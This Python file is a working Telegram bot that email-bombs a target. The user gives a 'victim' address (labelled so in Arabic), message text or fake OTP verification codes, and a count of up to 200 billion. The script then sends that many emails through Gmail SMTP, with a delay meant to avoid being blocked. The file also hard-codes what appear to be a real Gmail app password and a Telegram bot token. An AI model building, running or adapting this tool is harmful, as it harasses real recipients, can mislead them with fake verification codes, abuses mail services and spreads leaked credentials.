import telebot
import smtplib
import math
import random
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ---------------------------------------------------------
# إعدادات البريد الإلكتروني
# ---------------------------------------------------------

# ضع بريدك وكلمة المرور الخاصة بك هنا
fromaddr = "iphone011012013@gmail.com"
password = "qrpf wkub heck bnbi"

# ---------------------------------------------------------
# دوال التشفير والإرسال
# ---------------------------------------------------------

def generateOTP():
    """توليد رمز عشوائي"""
    digits = "0123456789"
    OTP = ""
    for i in range(6):
        OTP += digits[math.floor(random.random() * 10)]
    return OTP

def send_email(mail, subject, content):
    """ارسال الرسالة بدون إظهار العداد للمستلم"""
    toaddr = mail

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject # عنوان الرسالة (ثابت)

    # محتوى الرسالة (النص فقط بدون عداد)
    body = content
    txt = MIMEText(body, 'plain', 'utf-8')
    msg.attach(txt)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password.replace(" ", "")) 
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False

# ---------------------------------------------------------
# إعداد بوت تيليجرام
# ---------------------------------------------------------

API_TOKEN = '7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0'
bot = telebot.TeleBot(API_TOKEN)

# متغيرات لتخزين البيانات المؤقتة للمستخدم
user_data = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_data[message.chat.id] = {} # تهيئة بيانات المستخدم
    msg = bot.reply_to(message, "أهلاً بك! 🚀\nأرسل بريدك الإلكتروني المستلم (الضحية):")
    bot.register_next_step_handler(msg, process_email_step)

def process_email_step(message):
    email = message.text
    if "@" not in email or "." not in email:
        msg = bot.reply_to(message, "بريد خاطئ! حاول مرة أخرى:")
        bot.register_next_step_handler(msg, process_email_step)
        return

    # حفظ الإيميل
    user_data[message.chat.id]['email'] = email

    # الخطوة التالية: طلب محتوى الرسالة
    msg = bot.reply_to(message, "📝 ماذا تريد أن تكتب في الرسالة؟\n\n- اكتب **otp** ليرسل كود عشوائي متغير.\n- أو اكتب **أي نص تريده** ليتم إرساله كما هو.")
    bot.register_next_step_handler(msg, process_content_step)

def process_content_step(message):
    content = message.text
    user_data[message.chat.id]['content'] = content

    # الخطوة التالية: طلب العدد
    msg = bot.reply_to(message, "🔢 كم عدد الرسائل التي تريد إرسالها؟ (أدخل رقماً):")
    bot.register_next_step_handler(msg, process_count_step)

def process_count_step(message):
    chat_id = message.chat.id
    try:
        count = int(message.text)
        if count > 200000000000:
            bot.reply_to(message, "⚠️ العدد كبير جداً! الحد الأقصى هو 200000000000 رسالة.")
            return
        if count <= 0:
            bot.reply_to(message, "الرجاء إدخال رقم صحيح أكبر من صفر.")
            return
    except ValueError:
        bot.reply_to(message, "الرجاء إدخال أرقام فقط.")
        return

    # استرجاع البيانات المحفوظة
    email = user_data[chat_id]['email']
    msg_content_template = user_data[chat_id]['content']

    bot.send_message(chat_id, f"✅ سأبدأ الآن بإرسال {count} رسالة إلى {email}...")

    success_count = 0
    
    for i in range(1, count + 1):
        # تحديد محتوى الرسالة والعنوان
        if msg_content_template.lower() in ['otp', 'كود']:
            # إذا اختار المستخدم OTP، نولد رقم جديد وعنوان خاص بالكود
            current_message = f"رمز التحقق الخاص بك هو: {generateOTP()}"
            subject = "رمز التحقق (Verification Code)"
        else:
            # إذا اختار نص مخصص، نرسله كما هو
            current_message = msg_content_template
            subject = "رسالة جديدة (New Message)"

        # محاولة الإرسال
        if send_email(email, subject, current_message):
            # العداد يظهر لك أنت فقط في تيليجرام
            bot.send_message(chat_id, f"📤 تم إرسال الرسالة {i}/{count} بنجاح.")
            success_count += 1
        else:
            bot.send_message(chat_id, f"❌ فشل إرسال الرسالة {i}.")
        
        # انتظار 2 ثانية لتجنب الحظر
        time.sleep(2)

    bot.send_message(chat_id, f"🏁 انتهت العملية.\nنجح إرسال {success_count} من أصل {count}.")

print("Bot is running...")
bot.infinity_polling()